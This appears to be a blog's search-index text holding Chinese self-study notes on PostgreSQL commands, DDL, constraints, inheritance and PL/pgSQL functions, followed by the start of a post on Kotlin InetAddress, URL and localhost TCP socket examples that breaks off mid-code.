用于封装所有对数据库的访问，使数据访问逻辑和业务逻辑分开。 数据传递对象 值对象（Value Object） 实体对象（Entity） 对象关系映射（ORM）：Object Relation Mapping * 类中的对象的属性（Java）\u0026lt;— 映射（ORM） —\u0026gt;表中的记录的字段（Database） Initial initdb.exe -A scram-sha-256 -E UTF8 --no-locale --lc-messages=\u0026#34;Chinese (Simplified)_China.936\u0026#34; -U 123 -W -D D:\\12345 pg_ctl.exe -l D:\\log.txt -D D:\\12345 start pg_ctl.exe -l D:\\log.txt -D D:\\12345 status pg_ctl.exe -l D:\\log.txt -D D:\\12345 stop psql.exe -e -E -h 127.0.0.1 -p 5432 -U 123 -W -d postgres compile(\u0026#34;org.postgresql:postgresql:+\u0026#34;) 导出：pg_dump -h 127.0.0.1 -p 5432 -U 123 -W -d postgres -n erp -Fc -f data.dump 导入：pg_restore -h 127.0.0.1 -p 5432 -U 123 -W -d postgres -c data.dump Operate \\c 切换数据库 \\l 列出数据库 \\d 列出表、序列、视图 \\dt 列出表 \\du 列出角色 \\dn 列出模式 \\df 列出函数 \\dx 列出扩展 \\g 执行查询缓存区 \\p 显示查询缓存区 \\r 重置查询缓存区 \\e 使用外部编辑器编辑查询缓存区 \\w 将当前查询缓存区写至文件 \\o 将所有查询结果写至文件 \\i 将文件写至查询缓存区 \\x 垂直显示查询结果（\\x\\g\\x） \\t 只显示查询结果（无页眉和页脚） \\H 切换为 HTML 输出模式 \\q 退出 psql \\h SQL 语法说明 \\! 执行外部命令 \\set PROMPT1 123 设置提示符（https://www.postgresql.org/docs/current/app-psql.html#APP-PSQL-PROMPTING） \\pset pager off 关闭分页 \\timing 计时 \\conninfo 显示连接信息 \\password 修改密码 \\encoding 修改客户端编码 show all; 显示所有系统信息 show config_file; 显示系统配置文件 show server_version; 显示系统版本 show server_encoding; 显示服务端编码 show client_encoding; 显示客户端编码 select version(); 显示系统版本 select now(); 显示当前日期+时间 select current_timestamp; 显示当前日期+时间 select current_date; 显示当前日期 select current_time; 显示当前时间 select current_user; 显示当前用户 select current_database(); 显示当前数据库 select pg_postmaster_start_time(); 显示系统启动日期 {} 必选项 [] 可选项 | 选择分隔符 \u0026#39;\u0026#39; 表示字符串 \u0026#34;\u0026#34; 表示标识符（用于区分大小写和关键字；不常用，因为一般情况下标识符都为小写，并且不会与关键字重名，空格用 \u0026#39;_\u0026#39; 代替） 建议双引号要么都带，要么都不带。 Table Create DROP TABLE a; ------------------------------------------------------- CREATE TABLE a ( id INTEGER, name TEXT, price NUMERIC ); ------------------------------------------------------- 缺省值字段 CREATE TABLE a ( id SERIAL, 整形自增 name TEXT, price NUMERIC DEFAULT 9.99 默认值 ); ------------------------------------------------------- 表约束和列约束的区别是声明的位置不一样。 非空约束 检查约束（字段需要满足某个布尔表达式） CREATE TABLE a ( id INTEGER, name TEXT NOT NULL, 非空约束 price NUMERIC, CHECK (price \u0026gt; 0), \u0026#34;a_price_check\u0026#34;（检查约束）（表约束）（匿名） CONSTRAINT abc CHECK (price \u0026gt; 0) \u0026#34;abc\u0026#34;（检查约束）（表约束）（命名） ); ---- 唯一性约束 CREATE TABLE a ( id INTEGER UNIQUE, \u0026#34;a_id_key\u0026#34;（唯一性约束）（列约束）（匿名） name TEXT, price NUMERIC ); 等同于 CREATE TABLE a ( id INTEGER, name TEXT, price NUMERIC, UNIQUE (id) \u0026#34;a_id_key\u0026#34;（唯一性约束）（表约束）（匿名） ); 等同于 CREATE TABLE a ( id INTEGER, name TEXT, price NUMERIC, CONSTRAINT abc UNIQUE (id) \u0026#34;abc\u0026#34;（唯一性约束）（表约束）（命名） ); ---- 联合唯一性约束 = 列组 + 唯一性约束 CREATE TABLE a ( id INTEGER, name TEXT, price NUMERIC, UNIQUE (id, name) \u0026#34;a_id_name_key\u0026#34;（联合唯一性约束）（表约束）（匿名） ); ------------------------------------------------------- 主键 = 主键约束（列或列组）= 唯一且非空 = 唯一性约束 + 非空约束 = 记录的唯一标识符 PRIMARY KEY = UNIQUE NOT NULL CREATE TABLE a ( id INTEGER PRIMARY KEY, \u0026#34;a_pkey\u0026#34;（匿名） name TEXT, price NUMERIC ); 等同于 CREATE TABLE a ( id INTEGER CONSTRAINT abc PRIMARY KEY, \u0026#34;abc\u0026#34;（命名） name TEXT, price NUMERIC ); 等同于 CREATE TABLE a ( id INTEGER, name TEXT, price NUMERIC, PRIMARY KEY (id) \u0026#34;a_pkey\u0026#34;（表约束） ); ---- 联合主键 = 列组 + 主键 CREATE TABLE a ( id INTEGER, name TEXT, price NUMERIC, PRIMARY KEY (id, name) \u0026#34;a_pkey\u0026#34; ); ------------------------------------------------------- 外键 = 外键约束（列或列组）= 匹配（引用）另一张表的主键 = 维持关联表之间的引用完整性（数据一致性） CREATE TABLE a ( 主表 id INTEGER PRIMARY KEY, 主键 name TEXT, price NUMERIC ); CREATE TABLE b ( 从表 id INTEGER PRIMARY KEY, 主键 a_no INTEGER REFERENCES a (id), 外键 count INTEGER ); 等同于 CREATE TABLE b ( id INTEGER PRIMARY KEY, a_no INTEGER REFERENCES a, 自动将被引用表的主键作为被引用列 count INTEGER ); 等同于 CREATE TABLE b ( id INTEGER PRIMARY KEY, a_no INTEGER, count INTEGER, FOREIGN KEY (a_no) REFERENCES a 表约束 ); 等同于 CREATE TABLE b ( 从表 id INTEGER, a_no INTEGER, count INTEGER, PRIMARY KEY (id), 主键（表约束）（匿名） FOREIGN KEY (a_no) REFERENCES a 外键（表约束）（匿名） ); ------------------------------------------------------- 当删除或更新主表中的某条记录中的主键字段时，由于该条记录的主键字段被从表中某条记录所引用，所以操作将会失败（缺省）。 操作（主表）： ON DELETE ON UPDATE 响应（从表）： NO ACTION 不允许该操作（事务晚些时候检查）（缺省） RESTRICT 不允许该操作（事务早些时候检查）（常用） CASCADE 递归操作（删除引用行 or 引用行字段置为更新值）（常用） SET DEFAULT 引用行字段置为默认值 SET NULL 引用行字段置为 NULL CREATE TABLE b ( 从表 id INTEGER, a_no INTEGER, count INTEGER, PRIMARY KEY (id), 主键 FOREIGN KEY (a_no) REFERENCES a ON UPDATE CASCADE 外键（主表中被引用的记录不允许删除，但允许更新） ); Alter 添加字段（列） ------------------------------------------------------- ALTER TABLE a ADD COLUMN description TEXT; 已存在的记录的新字段将自动填充 NULL ALTER TABLE a ADD COLUMN description TEXT DEFAULT \u0026#39;未描述\u0026#39; CHECK (description != \u0026#39;\u0026#39;); 可以使用 CREATE TABLE 中对字段的描述语法 删除字段（列） ------------------------------------------------------- ALTER TABLE a DROP COLUMN description; 添加约束 表中的数据需在约束被添加之前就已经符合约束，否则将添加失败 ------------------------------------------------------- ALTER TABLE a ADD CHECK (name != \u0026#39;\u0026#39;); 检查约束 ALTER TABLE a ADD UNIQUE (name); 唯一性约束 ALTER TABLE a ADD FOREIGN KEY (name) REFERENCES b; 外键约束 ALTER TABLE a ALTER COLUMN name SET NOT NULL; 非空约束（没有表约束，只有列约束；并且没有名称） 删除约束 ------------------------------------------------------- ALTER TABLE a DROP CONSTRAINT \u0026#34;a_name_check\u0026#34;; 约束 ALTER TABLE a ALTER COLUMN name DROP NOT NULL; 非空约束（没有表约束，只有列约束；并且没有名称） 更改列的默认值 不会影响已存在的记录 ------------------------------------------------------- ALTER TABLE a ALTER COLUMN description SET DEFAULT \u0026#39;未描述\u0026#39;; 添加 ALTER TABLE a ALTER COLUMN description DROP DEFAULT; 删除（默认值为 NULL） 更改列的数据类型 表中的数据需通过隐式转换才能成功，否则需要使用 USING 子句进行显式转换 ------------------------------------------------------- ALTER TABLE a ALTER COLUMN description TYPE VARCHAR; 重命名字段 ------------------------------------------------------- ALTER TABLE a RENAME COLUMN description TO characterization; 重命名表 ------------------------------------------------------- ALTER TABLE a RENAME TO b; Schema 一个数据库集簇（Cluster）中的所有数据库只会共享 pg_database（数据库列表）、pg_group（用户组列表）、pg_shadow（有效用户列表）。 一个数据库中又包含一个或多个模式（Schema）。 一个模式中又包含表、函数、操作符、数据类型等其他类型。 层次：服务器 -\u0026gt; 数据库 -\u0026gt; 模式 -\u0026gt; 对象（表...） ------------------------------------------------------- CREATE SCHEMA a; 创建模式 ------------------------------------------------------- DROP SCHEMA a; 删除模式（模式需清空） DROP SCHEMA a CASCADE; 递归删除模式 ------------------------------------------------------- PostgreSQL 会自动将不带限定名的访问指向 public 模式。 CREATE TABLE a (); 等同于 CREATE TABLE public.a (); ------------------------------------------------------- 模式搜索路径 SHOW search_path; 查看 SET search_path TO a,public; 设置 Inherit CREATE TABLE a ( 创建父表 a_id INTEGER ); CREATE TABLE b ( 创建子表 b_id INTEGER ) INHERITS (a); 继承自 a 表（拥有 a 表的所有字段） ---- postgres=# \\d+ a 查看父表属性 数据表 \u0026#34;public.a\u0026#34; 栏位 | 类型 | 修饰词 | 存储 | 统计目标 | 描述 a_id | integer | | plain | | 子表: b postgres=# \\d+ b 查看子表属性 数据表 \u0026#34;public.b\u0026#34; 栏位 | 类型 | 修饰词 | 存储 | 统计目标 | 描述 a_id | integer | | plain | | b_id | integer | | plain | | 继承: a ------------------------------------------------------- INSERT INTO a VALUES (1); 父表插入记录 INSERT INTO a VALUES (2); INSERT INTO a VALUES (3); INSERT INTO b VALUES (1, 101); 子表插入记录 SELECT * FROM a; 默认包括所有子表记录 a_id ------ 1 2 3 1 SELECT * FROM ONLY a; 显式声明只查看父表记录（SELECT、UPDATE、DELETE 都支持 ONLY 关键字;） a_id ------ 1 2 3 SELECT * FROM b; 查看子表记录 a_id | b_id ------+------ 1 | 101 ------------------------------------------------------- TRUNCATE TABLE a; 使用 TRUNCATE 清空父表记录时，子表记录会一同被清空 SELECT * FROM a; 默认包括所有子表记录 a_id ------ ------------------------------------------------------- 确定记录来源 SELECT a.*, a.TABLEOID tableoid 为系统隐含字段 FROM a; a_id | tableoid ------+---------- 1 | 17126 2 | 17126 3 | 17126 1 | 17129 SELECT a.*, p.relname FROM a, pg_class p WHERE a.TABLEOID = p.OID; 将 tableoid 与系统表 pg_class 进行关联以获得实际表名 a_id | relname ------+--------- 1 | a 2 | a 3 | a 1 | b ---- SELECT a.*, a.TABLEOID :: REGCLASS FROM a; a_id | tableoid ------+---------- 1 | a 2 | a 3 | a 1 | b ------------------------------------------------------- 多表继承：一个表可以有多个父表，此时它拥有所有父表们的字段总和。 若出现同名字段，则必须是相同数据类型，否则将继承失败；合并后的字段拥有它所继承的字段的所有约束（检查、非空）。 约束：父表上的检查约束和非空约束都会被继承，而其他类型的约束（唯一、主键、外键）则不会被继承。 访问权限：表的继承并不包括访问权限；因此，访问父表的用户还必须具有访问子表的权限，或者使用 ONLY 关键字显式声明只查看父表记录。 Partition 分区：通过继承来实现数据分离。 范围划分 列表划分 CREATE TABLE a ( id INTEGER, gender TEXT, name TEXT ); CREATE TABLE b1 ( PRIMARY KEY (id), CHECK (gender = \u0026#39;男\u0026#39;) ) INHERITS (a); CREATE TABLE b2 ( PRIMARY KEY (id), CHECK (gender = \u0026#39;女\u0026#39;) ) INHERITS (a); Function SQL（查询语言函数） 函数：可重载，有多态。 函数体：包含在字符文本中的 SQL 语句集合（\u0026#39;\u0026#39;、$$$$（推荐））。 参数修饰：IN（输入）（缺省），OUT（输出），INOUT（输入+输出），VARIADIC（可变长参数）。 CREATE TABLE a ( 测试表 name TEXT, age INTEGER, salary NUMERIC ); INSERT INTO a VALUES (\u0026#39;小张\u0026#39;, 25, 4999.9); 测试数据 INSERT INTO a VALUES (\u0026#39;小陈\u0026#39;, 23, 3999.9); ------------------------------------------------------- 若函数返回值不为 Void，则最后一条语句必须是 SELECT、INSERT、UPDATE、带有 RETURNING 子句的 DELETE。 CREATE OR REPLACE FUNCTION a(IN INTEGER, OUT VOID) AS $$ 接收 INTEGER，返回 Void（创建） $$ LANGUAGE SQL; 等同于 CREATE OR REPLACE FUNCTION a(INTEGER) RETURNS VOID AS $$ IN：缺省值，可省略；OUT：需显式声明（单个结果可在括号外声明） $$ LANGUAGE SQL; 等同于 CREATE OR REPLACE FUNCTION a(INTEGER) RETURNS VOID AS \u0026#39;\u0026#39; 使用 \u0026#39;\u0026#39; 替代 $$$$ 表示字符串 LANGUAGE SQL; DROP FUNCTION a( INTEGER ); （删除） SELECT a(1); 返回 Void（NULL）（调用） ------------------------------------------------------- 基本类型 CREATE OR REPLACE FUNCTION a(OUT INTEGER) AS $$ 无参，返回 INTEGER SELECT 1; 返回 1 $$ LANGUAGE SQL; DROP FUNCTION a(); SELECT a(); ---- CREATE OR REPLACE FUNCTION a(OUT VOID) AS $$ 无参，返回 NULL DROP TABLE a CASCADE; 递归删除表 a $$ LANGUAGE SQL; DROP FUNCTION a(); SELECT a(); ---- CREATE OR REPLACE FUNCTION a(INTEGER, INTEGER, OUT INTEGER) AS $$ SELECT $1 + $2; 通过 $n 调用入参 $$ LANGUAGE SQL; DROP FUNCTION a( INTEGER, INTEGER ); SELECT a(1, 2); 返回 3 ------------------------------------------------------- CREATE OR REPLACE FUNCTION a(a a, OUT INTEGER) AS $$ SELECT (a.salary * 2) :: INTEGER; NUMERIC ➜ INTEGER $$ LANGUAGE SQL; DROP FUNCTION a( a ); SELECT name, a(a) dream FROM a; name | dream ------+------- 小张 | 10000 小陈 | 8000 SELECT name, a(ROW (name, age, salary * 1.1)) dream FROM a; ROW 构造函数 name | dream ------+------- 小张 | 11000 小陈 | 8800 ------------------------------------------------------- 返回值为复合类型（多个列（结果）） CREATE OR REPLACE FUNCTION a(OUT a) AS $$ 返回 a 类型 SELECT ROW (\u0026#39;小红\u0026#39;, 21, 3499.9) :: a; Record ➜ a $$ LANGUAGE SQL; DROP FUNCTION a(); SELECT ROW (\u0026#39;小红\u0026#39;, 21, 3499.9) :: a; 等同于 SELECT a(); row ------------------ (小红,21,3499.9) SELECT (a()).name; name ------ 小红 SELECT * FROM a(); name | age | salary ------+-----+-------- 小红 | 21 | 3499.9 ---- CREATE OR REPLACE FUNCTION a(x INTEGER, y INTEGER, OUT sum INTEGER, OUT multiply INTEGER) AS $$ 返回 Record 类型 SELECT x + y, x * y; 命名参数 $$ LANGUAGE SQL; DROP FUNCTION a( INTEGER, INTEGER ); SELECT * FROM a(5, 10); 等同于 SELECT (a(5, 10)).*; sum | multiply -----+---------- 15 | 50 ------------------------------------------------------- 返回值为多条记录，此类函数多用于 FROM 子句：SETOF、RETURNS TABLE 若无以上关键字，则默认只取第一条记录。 CREATE OR REPLACE FUNCTION a() RETURNS SETOF a AS $$ 返回 a 类型 SELECT * FROM a; $$ LANGUAGE SQL; DROP FUNCTION a(); SELECT * FROM a(); name | age | salary ------+-----+-------- 小张 | 25 | 4999.9 小陈 | 23 | 3999.9 ---- CREATE OR REPLACE FUNCTION a(OUT name TEXT, OUT salary NUMERIC) RETURNS SETOF RECORD AS $$ 返回 Record 类型 SELECT name, salary FROM a; $$ LANGUAGE SQL; DROP FUNCTION a(); SELECT * FROM a(); name | salary ------+-------- 小张 | 4999.9 小陈 | 3999.9 等同于 CREATE OR REPLACE FUNCTION a() RETURNS TABLE(name TEXT, salary NUMERIC) AS $$ RETURNS TABLE 可用于替代 RETURNS SETOF 的 Record 类型，语法更简洁 SELECT name, salary FROM a; $$ LANGUAGE SQL; DROP FUNCTION a(); SELECT * FROM a(); name | salary ------+-------- 小张 | 4999.9 小陈 | 3999.9 ------------------------------------------------------- 多态函数：ANYELEMENT、ANYARRAY、ANYNONARRAY、ANYENUM CREATE OR REPLACE FUNCTION a(ANYELEMENT, ANYELEMENT, OUT ANYARRAY) AS $$ SELECT ARRAY [$1, $2]; $$ LANGUAGE SQL; DROP FUNCTION a( ANYELEMENT, ANYELEMENT ); SELECT a(1, 2), a(\u0026#39;A\u0026#39; :: TEXT, \u0026#39;B\u0026#39;); 参数类型需一致，并且显式声明其类型 a | a -------+------- {1,2} | {A,B} ---- CREATE OR REPLACE FUNCTION a(ANYELEMENT, ANYELEMENT, OUT BOOLEAN) AS $$ SELECT $1 \u0026gt; $2; $$ LANGUAGE SQL; DROP FUNCTION a( ANYELEMENT, ANYELEMENT ); SELECT a(2, 1), a(1, 2), a(\u0026#39;A\u0026#39; :: TEXT, \u0026#39;B\u0026#39;); a | a | a ---+---+--- t | f | f ---- CREATE OR REPLACE FUNCTION a(i ANYELEMENT, OUT o1 ANYELEMENT, OUT o2 ANYARRAY) AS $$ SELECT i, ARRAY [i, i]; $$ LANGUAGE SQL; DROP FUNCTION a( ANYELEMENT ); SELECT * FROM a(2); o1 | o2 ----+------- 2 | {2,2} ------------------------------------------------------- 默认参数值：DEFAULT CREATE OR REPLACE FUNCTION a(x INTEGER DEFAULT 1, y INTEGER DEFAULT 10, z INTEGER DEFAULT 100, OUT INTEGER) AS $$ SELECT x + y + z; $$ LANGUAGE SQL; DROP FUNCTION a( INTEGER, INTEGER, INTEGER ); SELECT a(); a ----- 111 SELECT a(0); a ----- 110 SELECT a(0, 0); a ----- 100 SELECT a(0, 0, 0); a --- 0 SELECT a(z := 0); 命名参数 a ---- 11 ------------------------------------------------------- 可变长参数（数组）：VARIADIC CREATE OR REPLACE FUNCTION a(VARIADIC TEXT [], OUT INTEGER) AS $$ SELECT array_length($1, 1); 返回（一维数组的）数组长度 $$ LANGUAGE SQL; DROP FUNCTION a( TEXT [] ); SELECT a(\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;); a --- 3 SELECT a(VARIADIC ARRAY [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;]); a --- 3 SELECT a(VARIADIC ARRAY []:: TEXT []); 返回 NULL ---- SELECT generate_subscripts(ARRAY [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;], 1); 返回（一维数组的）数组下标 generate_subscripts --------------------- 1 2 3 等同于 SELECT * FROM generate_subscripts(ARRAY [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;], 1) abc(def); def ----- 1 2 3 CREATE OR REPLACE FUNCTION a(VARIADIC ANYARRAY, OUT ANYELEMENT) AS $$; SELECT min($1 [def]) FROM generate_subscripts($1, 1) abc(def); 利用多态和可变长参数求任意数组最小值 $$ LANGUAGE SQL; Note： min($1 [def]) 通过数组下标 def 取出数组的所有元素，再通过系统函数 min() 求出列的最小值。 DROP FUNCTION a( ANYARRAY ); SELECT a(10, -1, 5, 4, 6); a ---- -1 SELECT a(\u0026#39;a\u0026#39; :: TEXT, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;); a --- a PL/pgSQL（程序语言函数） 块结构： [ \u0026lt;\u0026lt;label\u0026gt;\u0026gt; ] [ DECLARE declarations ] BEGIN statements END [ label ]; ------------------------------------------------------- CREATE OR REPLACE FUNCTION a() RETURNS INTEGER AS $$ BEGIN RAISE NOTICE \u0026#39;% %\u0026#39;, \u0026#39;ABC\u0026#39;, 123; RETURN 1; END; $$ LANGUAGE PLPGSQL; DROP FUNCTION a(); SELECT a(); 注意: ABC 123 a --- 1 ------------------------------------------------------- 变量作用域 CREATE OR REPLACE FUNCTION a() RETURNS INTEGER AS $$ \u0026lt;\u0026lt; abc \u0026gt;\u0026gt; DECLARE a INTEGER := 30; BEGIN RAISE NOTICE \u0026#39;Out: a = %\u0026#39;, a; 30 a := 50; \u0026lt;\u0026lt; def \u0026gt;\u0026gt; 子块开始 DECLARE a INTEGER := 100; BEGIN RAISE NOTICE \u0026#39;In: a = %\u0026#39;, a; 100 RAISE NOTICE \u0026#39;In: def.a = %\u0026#39;, def.a; 100 RAISE NOTICE \u0026#39;In: abc.a = %\u0026#39;, abc.a; 50 END; 子块结束 RAISE NOTICE \u0026#39;Out: a = %\u0026#39;, a; 50 RETURN a; END; $$ LANGUAGE PLPGSQL; DROP FUNCTION a(); SELECT a(); 注意: Out: a = 30 注意: In: a = 100 注意: In: def.a = 100 注意: In: abc.a = 50 注意: Out: a = 50 a ---- 50 ------------------------------------------------------- 变量声明：PL/pgSQL 中的变量都需在 DECLARE 块中声明，声明格式： name [ CONSTANT ] type [ COLLATE collation_name ] [ NOT NULL ] [ { DEFAULT | := | = } expression ]; CREATE OR REPLACE FUNCTION a() RETURNS VOID AS $$ DECLARE a INTEGER; NULL b INTEGER DEFAULT 1; 初始值（每次进入该块时都将重新赋值（计算）） c INTEGER NOT NULL = 2; 不能赋值为 NULL d INTEGER = 3; 变量 e CONSTANT INTEGER = 4; 常量 BEGIN RAISE NOTICE \u0026#39;% % % % %\u0026#39;, a, b, c, d, e; END; $$ LANGUAGE PLPGSQL; DROP FUNCTION a(); SELECT a(); 注意: \u0026lt;NULL\u0026gt; 1 2 3 4 a --- ---- CREATE OR REPLACE FUNCTION a() RETURNS TEXT AS $$ DECLARE a TIMESTAMP DEFAULT now(); 每次调用初始值都不一样 BEGIN RETURN a; END; $$ LANGUAGE PLPGSQL; DROP FUNCTION a(); SELECT a(); a ---------------------------- 2017-03-02 15:15:27.452181 ------------------------------------------------------- 返回值 单条复合类型： CREATE OR REPLACE FUNCTION a(INTEGER, INTEGER, OUT sum INTEGER, OUT multiply INTEGER) AS $$ BEGIN sum = $1 + $2; multiply = $1 * $2; END; $$ LANGUAGE PLPGSQL; DROP FUNCTION a( INTEGER, INTEGER ); SELECT * FROM a(5, 10); 等同于 SELECT (a(5, 10)).*; sum | multiply -----+---------- 15 | 50 多条复合类型： CREATE OR REPLACE FUNCTION a() RETURNS TABLE(name TEXT, salary NUMERIC) AS $$ BEGIN RETURN QUERY SELECT abc.name, abc.salary FROM a abc; 设置别名避免与函数名冲突 END; $$ LANGUAGE PLPGSQL; DROP FUNCTION a(); SELECT * FROM a(); name | salary ------+-------- 小张 | 4999.9 小陈 | 3999.9 多态类型： CREATE OR REPLACE FUNCTION a(ANYELEMENT, ANYELEMENT, ANYELEMENT, OUT o ANYELEMENT) AS $$ BEGIN o = $1 + $2 + $3; END; $$ LANGUAGE PLPGSQL; DROP FUNCTION a( ANYELEMENT, ANYELEMENT, ANYELEMENT ); SELECT a(1, 2, 3); a --- 6 ------------------------------------------------------- 复制类型：%TYPE（基本类型），%ROWTYPE（复合类型） CREATE OR REPLACE FUNCTION a(a.age%TYPE, OUT s TEXT) AS $$ DECLARE o a%ROWTYPE; BEGIN SELECT * INTO o FROM a WHERE age = $1; 装入 o 中 s = o.name || \u0026#39; \u0026#39; || o.age || \u0026#39; \u0026#39; || o.salary; END; $$ LANGUAGE PLPGSQL; DROP FUNCTION a( INTEGER ); SELECT a(25); a ---------------- 小张 25 4999.9 记录类型： name RECORD; ------------------------------------------------------- PL/pgSQL 语句 \u0026#39;IF expression THEN ...\u0026#39; 执行时，将给主 SQL 引擎 发送一个查询 \u0026#39;SELECT expression\u0026#39;\u0026#39; 来计算表达式的返回值。 赋值：variable { := | = } expression; 若数据类型不匹配，将强制转换；若转换失败，将以文本方式转换，否则发生异常。 a = b * 0.06; my_record.user_id = 20; ------------------------------------------------------- 没有返回值的命令：PERFORM query; 执行命令并忽略其返回值，与 SELECT 写法一致，只是将 SELECT 替换为 PERFORM。 PERFORM create_mv(\u0026#39;cs_session_page_requests_mv\u0026#39;, my_query); ------------------------------------------------------- 返回一行结果的命令：INTO target 除了 INTO 子句，SQL 语句的其他部分的语法不变。 SELECT select_expressions INTO [STRICT] target FROM ...; INSERT ... RETURNING expressions INTO [STRICT] target; UPDATE ... RETURNING expressions INTO [STRICT] target; DELETE ... RETURNING expressions INTO [STRICT] target; 无 STRICT：target 为该查询返回的第一个行，无结果则为 NULL。 ---- SELECT * INTO myrec FROM emp WHERE empname = myname; IF NOT FOUND THEN 没有行（try-catch） RAISE EXCEPTION \u0026#39;employee % not found\u0026#39;, myname; END IF; 有 STRICT：该查询必须刚好返回一个行，否则发生异常；成功执行带 STRICT 的命令总是会将 FOUND 置为真。 ---- BEGIN SELECT * INTO STRICT myrec FROM emp WHERE empname = myname; EXCEPTION WHEN NO_DATA_FOUND THEN 没有行（try-catch） RAISE EXCEPTION \u0026#39;employee % not found\u0026#39;, myname; WHEN TOO_MANY_ROWS THEN 多于一行（try-catch） RAISE EXCEPTION \u0026#39;employee % not unique\u0026#39;, myname; END; CREATE OR REPLACE FUNCTION a(INTEGER, OUT r a) AS $$ BEGIN SELECT * INTO STRICT r FROM a WHERE age = $1; EXCEPTION WHEN NO_DATA_FOUND THEN RAISE EXCEPTION \u0026#39;age % not found\u0026#39;, $1; WHEN TOO_MANY_ROWS THEN RAISE EXCEPTION \u0026#39;age % not unique\u0026#39;, $1; END $$ LANGUAGE PLPGSQL; DROP FUNCTION a( INTEGER ); SELECT * FROM a(25); name | age | salary ------+-----+-------- 小张 | 25 | 4999.9 SELECT * FROM a(99); 错误: age 99 not found 背景: 在RAISE的第10行的PL/pgSQL函数a(integer) ------------------------------------------------------- 占位语句（什么也不做）：NULL; 能够指示 if/then/else 链中故意留出的空分支。 CREATE OR REPLACE FUNCTION a() RETURNS VOID AS $$ DECLARE x INTEGER = 1; y INTEGER; BEGIN y = x / 0; EXCEPTION WHEN division_by_zero THEN 忽略异常 等同于 EXCEPTION WHEN division_by_zero THEN NULL; 忽略异常（更直观） END; $$ LANGUAGE PLPGSQL; DROP FUNCTION a(); SELECT a(); EXPLAIN ANALYZE SELECT * FROM customer; --显示语句的执行计划 ALTER TABLE account DISABLE TRIGGER ALL; --禁用外键约束 ALTER TABLE account ENABLE TRIGGER ALL; --启用外键约束 SELECT * FROM pg_available_extension_versions; --查询可加载插件 SELECT * FROM pg_extension; --查询已加载插件 Tool https://www.postgresql.org/ftp/pgadmin/pgadmin4/ https://github.com/sosedoff/pgweb/releases/latest https://github.com/dbcli/pgcli https://www.heidisql.com/download.php https://www.jetbrains.com/datagrip/ ","permalink":"https://xhstormr.github.io/blog/posts/postgresql/","summary":"","title":"自学 PostgreSQL"},{"content":"Updated on 2017-02-16\nSocket：属于 操作系统提供 的一个 API 接口，不属于 TCP/IP 协议栈，工作在应用层与传输层之间，由 协议 和 地址 共同确定。 协议：TCP（面向连接，可靠）、UDP（面向无连接，不可靠）。 地址： IP：IPv4（192.168.1.1）、IPv6。 端口：[0,65535]，其中 [0,1023] 为系统所保留。 Uniform Resource Locator（URL）：统一资源定位器，表示 Internet 上某一 资源地址。 http://blog.xhstormr.tk:80/post/jooq/index.html?abc=123\u0026amp;def=456#top 由 协议名 和 资源名 共同组成，中间用 冒号 隔开。 InetAddress fun main(args: Array\u0026lt;String\u0026gt;) { // InetAddress.getByName(\u0026#34;192.168.1.2\u0026#34;) // InetAddress.getByName(\u0026#34;DESKTOP-OPN10MH\u0026#34;) val inetAddress = InetAddress.getLocalHost() println(inetAddress) println(\u0026#34;计算机名：${inetAddress.hostName}\u0026#34;) println(\u0026#34;IP地址：${inetAddress.hostAddress}\u0026#34;) println(\u0026#34;IP地址（字节数组）：${Arrays.toString(inetAddress.address)}\u0026#34;) } ---- 输出： DESKTOP-OPN10MH/192.168.1.2 计算机名：DESKTOP-OPN10MH IP地址：192.168.1.2 IP地址（字节数组）：[-64, -88, 1, 2] URL fun main(args: Array\u0026lt;String\u0026gt;) { val url1 = URL(\u0026#34;http://blog.xhstormr.tk:80\u0026#34;) val url2 = URL(url1, \u0026#34;/post/jooq/index.html?abc=123\u0026amp;def=456#top\u0026#34;) println(url2) println(\u0026#34;协议：${url2.protocol}\u0026#34;) println(\u0026#34;主机：${url2.host}\u0026#34;) println(\u0026#34;端口：${url2.port}\u0026#34;) println(\u0026#34;文件名：${url2.file}\u0026#34;) println(\u0026#34;文件路径：${url2.path}\u0026#34;) println(\u0026#34;相对路径(#)：${url2.ref}\u0026#34;) println(\u0026#34;查询参数(?)：${url2.query}\u0026#34;) } ---- 输出： http://blog.xhstormr.tk:80/post/jooq/index.html?abc=123\u0026amp;def=456#top 协议：http 主机：blog.xhstormr.tk 端口：80 文件名：/post/jooq/index.html?abc=123\u0026amp;def=456 文件路径：/post/jooq/index.html 相对路径(#)：top 查询参数(?)：abc=123\u0026amp;def=456 TCP Socket ServerSocket 服务端（多线程）： ---- fun main(args: Array\u0026lt;String\u0026gt;) { ServerSocket(4567).use { while (true) { Thread(A(it.accept())).start() 开始监听连接，阻塞方法 } } } class A(val socket: Socket) : Runnable { 线程体 override fun run() { socket.use { println(\u0026#34;运行线程：${Thread.currentThread()}\u0026#34;) println(\u0026#34;本地地址：${it.localAddress} 本地端口：${it.localPort}\u0026#34;) println(\u0026#34;远端地址：${it.inetAddress} 远端端口：${it.port}\u0026#34;) val `in` = DataInputStream(it.inputStream) 输入流 val out = DataOutputStream(it.outputStream) 输出流 println(\u0026#34;Receive：${`in`.readUTF()}\u0026#34;) 阻塞方法 out.writeUTF(\u0026#34;Hello Client!\u0026#34;) } 通讯结束 } 子线程结束 } ---- 输出： 运行线程：Thread[Thread-0,5,main] 本地地址：/127.0.0.1 本地端口：4567 远端地址：/127.0.0.1 远端端口：54569 Receive：Hello Server! 客户端： ---- fun main(args: Array\u0026lt;String\u0026gt;) { Socket(\u0026#34;127.0.0.1\u0026#34;, 4567).use { println(\u0026#34;运行线程：${Thread.currentThread()}\u0026#34;) println(\u0026#34;本地地址：${it.localAddress} 本地端口：${it.localPort}\u0026#34;) println(\u0026#34;远端地址：${it.inetAddress} 远端端口：${it.port}\u0026#34;) val `in` = DataInputStream(it.inputStream) 输入流 val out = DataOutputStream(it.outputStream) 输出流 out.writeUTF(\u0026#34;Hello Server!\u0026#34;) println(\u0026#34;Receive：${`in`.readUTF()}\u0026#34;) 阻塞方法 } 通讯结束 } 主线程结束 ---- 输出： 运行线程：Thread[main,5,main] 本地地址：/127.0.0.1 本地端口：54569 远端地址：/127.0.0.1 远端端口：4567 Receive：Hello Client! UDP DatagramPacket DatagramSocket 服务端： ---- fun main(args: Array\u0026lt;String\u0026gt;) { val data1 = 